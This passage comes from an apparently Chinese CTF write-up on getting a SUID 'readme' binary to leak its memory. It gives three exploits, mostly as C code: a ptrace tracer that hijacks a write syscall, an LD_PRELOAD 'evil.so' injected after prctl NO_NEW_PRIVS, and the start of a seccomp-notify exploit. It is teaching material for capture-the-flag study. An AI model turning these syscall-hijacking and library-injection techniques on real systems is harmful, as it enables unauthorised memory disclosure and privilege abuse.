class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;   <br>    <span class="hljs-comment">// X32 ABI å¯¹æŒ‡é’ˆè¦æ±‚ 32 ä½</span><br>    regs = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">pid_t</span> traced_process;<br>    <span class="hljs-type">long</span> ins;<br>    <span class="hljs-type">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// è·å–ç¨‹åºåŸºå€ï¼Œç”¨ strace åœ¨æœ¬åœ°è§‚å¯Ÿå¾—åˆ°ç‰¹å¾</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// éšä¾¿åŠ«æŒä¸€ä¸ª Write çš„ç³»ç»Ÿè°ƒç”¨ï¼Œrsi åŠ«æŒåˆ°åŸºå€ï¼Œrdx å¤§å°å¤§ä¸€ç‚¹</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016020408849.png" alt="image-20221016020408849"></p><h3 id="Exp2-LD-PRELOAD"><a class="header-anchor" href="#Exp2-LD-PRELOAD">Â¶</a>Exp2(LD_PRELOAD)</h3><p>ç»“æŸååœ¨ Discord çœ‹åˆ°ç©ºç™½å¸ˆå‚…å‘çš„ Expï¼Œé™·å…¥äº†æ²‰æ€ ğŸ¤”ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202210191813572.png" alt=""></p><p>æˆ‘ä»¬çŸ¥é“ï¼Œè®¾ç½®äº† SUID çš„ç¨‹åºï¼ˆæœ¬é¢˜çš„ <code>readme</code>ï¼‰ä¸€èˆ¬ä¸èµ° LD_PRELOAD ç­‰ç¯å¢ƒå˜é‡(<a href="https://linux.die.net/man/8/ld.so">æ–‡æ¡£</a>)ã€‚</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">LD_PRELOAD</span><br>è¦åœ¨æ‰€æœ‰å…¶ä»–å…±äº«åº“ä¹‹å‰åŠ è½½çš„é™„åŠ çš„ã€ç”¨æˆ·æŒ‡å®šçš„ <span class="hljs-string">ELF</span> å…±äº«åº“çš„åˆ—è¡¨ã€‚åˆ—è¡¨ä¸­çš„é¡¹ç›®å¯ä»¥ç”¨ç©ºæ ¼æˆ–å†’å·åˆ†éš”ã€‚è¿™å¯ç”¨äºé€‰æ‹©æ€§åœ°è¦†ç›–å…¶ä»–å…±äº«åº“ä¸­çš„å‡½æ•°ã€‚ä½¿ç”¨æè¿°ä¸‹ç»™å‡ºçš„è§„åˆ™æœç´¢åº“ã€‚å¯¹äº <span class="hljs-built_in">set-user-ID/set-group-ID</span> <span class="hljs-string">ELF</span> äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…å«æ–œæ çš„é¢„åŠ è½½è·¯å¾„åå°†è¢«å¿½ç•¥ï¼Œå¹¶ä¸”åªæœ‰åœ¨åº“æ–‡ä»¶ä¸Šå¯ç”¨äº† <span class="hljs-built_in">set-user-ID</span> æƒé™ä½æ—¶æ‰ä¼šåŠ è½½æ ‡å‡†æœç´¢ç›®å½•ä¸­çš„åº“ã€‚<br><span class="hljs-string">LD_DEBUG</span><br>ï¼ˆ<span class="hljs-string">glibc</span> è‡ª <span class="hljs-string">2</span>.<span class="hljs-string">1</span> èµ·ï¼‰è¾“å‡ºæœ‰å…³åŠ¨æ€é“¾æ¥å™¨çš„è¯¦ç»†è°ƒè¯•ä¿¡æ¯ã€‚å¦‚æœè®¾ç½®ä¸º<span class="hljs-string">all</span>ï¼Œåˆ™æ‰“å°å®ƒæ‹¥æœ‰çš„æ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼Œå¦‚æœè®¾ç½®ä¸º <span class="hljs-string">help</span> ï¼Œåˆ™æ‰“å°ä¸€æ¡å¸®åŠ©æ¶ˆæ¯ï¼Œè¯´æ˜å¯ä»¥åœ¨æ­¤ç¯å¢ƒå˜é‡ä¸­æŒ‡å®šå“ªäº›ç±»åˆ«ã€‚ä» <span class="hljs-string">glibc</span> <span class="hljs-string">2</span>.<span class="hljs-string">3</span>.<span class="hljs-string">4</span>å¼€å§‹ï¼Œå¯¹äº <span class="hljs-built_in">set-user-ID/set-group-ID</span> äºŒè¿›åˆ¶æ–‡ä»¶ ï¼Œ <span class="hljs-string">LD_DEBUG</span>è¢«å¿½ç•¥ã€‚<br></code></pre></td></tr></table></figure><p>äº‹åæˆ‘å»è¯·æ•™äº†ä¸‹ç©ºç™½å¸ˆå‚…ï¼Œå¤§æ„æ˜¯èµ°ä¸èµ° LD_PRELOAD è¿™ç§å˜é‡ï¼Œå…¶å®æ˜¯æ ¹æ® SUID <strong>æ˜¯å¦çœŸå®ç”Ÿæ•ˆ</strong>æ¥åˆ¤æ–­çš„ã€‚è¿™é‡Œé€šè¿‡ prctl <strong>ç¦æ­¢</strong>äº† SUID ç”Ÿæ•ˆï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ç¨‹åºå†…æ‰§è¡Œçš„æ–‡ä»¶å°±ä¸å†å½“åš SUID æ–‡ä»¶å¤„ç†ã€‚</p><ul><li>ä¸ºä»€ä¹ˆ prctl å¯ä»¥ç¦æ­¢ SUID ç”Ÿæ•ˆï¼Ÿ</li></ul><p><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">æ–‡æ¡£</a>æ˜¯æˆ‘å ï¼Œå¯ä»¥çœ‹åˆ° SUID è¢«ç‚¹åè¡¨æ‰¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">The</span> execve system call can grant a newly-started program privileges that<br>its parent did not have.  <span class="hljs-title class_">The</span> most obvious examples are setuid/setgid<br>programs and file capabilities.  <span class="hljs-title class_">To</span> prevent the parent program <span class="hljs-keyword">from</span><br>gaining these privileges <span class="hljs-keyword">as</span> well, the kernel and user code must be<br>careful to prevent the parent <span class="hljs-keyword">from</span> doing anything that could subvert the<br>child.  <br>...<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç®€å•çš„å†™å‡º Expï¼š</p><p>å…ˆæ•´ä¸ªåº“ï¼Œç„¶åç®€å•è½¬æ¢ä¸‹æ ¼å¼æ”¾åˆ° exp é‡Œé¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span> &#123;<br>    write(<span class="hljs-number">1</span>,data<span class="hljs-number">-0x100</span>,<span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC a.c -o evil.so<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">char</span> evilso[] = &#123;å¤ªé•¿ä¸å†™&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    FILE *fp = fopen(<span class="hljs-string">&quot;/tmp/evil.so&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>    fwrite(evilso,<span class="hljs-keyword">sizeof</span>(evilso),<span class="hljs-number">1</span>,fp);<br>    fclose(fp);<br>    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">char</span> *envp[] = &#123;<span class="hljs-string">&quot;LD_PRELOAD=/tmp/evil.so&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>,args,envp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016135122114.png" alt="image-20221016135122114"></p><h3 id="Exp3-Seccomp-Notify"><a class="header-anchor" href="#Exp3-Seccomp-Notify">Â¶</a>Exp3(Seccomp Notify)</h3><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016023043480.png" alt="image-20221016023043480"></p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016023104368.png" alt="image-20221016023104368"></p><p>åæ¥å‘ç°ä¸Šé¢ä¿©è§£éƒ½ä¸æ˜¯é¢„æœŸè§£ï¼Œå®åœ¨æ˜¯å¤ªğŸ˜ˆäº†ã€‚</p><p>é‚£ä¹ˆè§‚å¯Ÿå‡ºé¢˜äººDiscordå‘è¨€ï¼Œé¢„æœŸæ˜¯ä¸€ä¸ªå« <code>Seccomp Notify</code> çš„æœºåˆ¶ï¼Œæ˜‚ï¼Œä¹Ÿèƒ½æ‹¦æˆªç³»ç»Ÿè°ƒç”¨ç„¶åè¿›è¡ŒåŠ«æŒã€‚çœ‹äº†<a href="http://just4coding.com/2022/04/03/seccomp/">è¿™ç¯‡æ–‡ç« </a>åŸºæœ¬çš„æ¨¡æ¿å°±èƒ½æŒæ¡äº†ã€‚</p><p>ç”±äº <code>Ubuntu 1804</code> è²Œä¼¼ç¼ºäº†åº“å•¥çš„ <code>Notify</code> ç”¨ä¸äº†ï¼Œå¹²è„†ç›´æ¥å¼€ä¸ª Socat æ‹¿ 2204 æµ‹è¯•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat TCP-LISTEN:6000,fork,reuseaddr EXEC:<span class="hljs-string">&quot;python3 deploy.py&quot;</span>,pty,stderr<br></code></pre></td></tr></table></figure><p>Seccomp Notify è¯´å®è¯ï¼Œæ„Ÿè§‰ä¸å¦‚ <code>Ptrace</code> â€¦å¼ºã€‚è¿™ç©æ„è²Œä¼¼ç”¨é€”æ˜¯ç”¨æ¥æ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨ï¼Œæ²¡æœ‰ <code>Ptrace</code> é‚£ç§çˆ¸çˆ¸æ‰“å„¿å­ï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°å¯„å­˜å™¨éƒ½ç»™ä½  ğŸ‘ æ¨‚çš„é‚£ç§ power :d</p><p>æœ¬æ¥å‡†å¤‡åœ¨å®˜æ–¹ä¹‹å‰å†™å‡ºæ¥çš„ XDï¼Œç»“æœå½“é¸½å­äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ”¾å®˜æ–¹ exp å¥½äº† XDï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// exploit.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg)    \</span><br><span 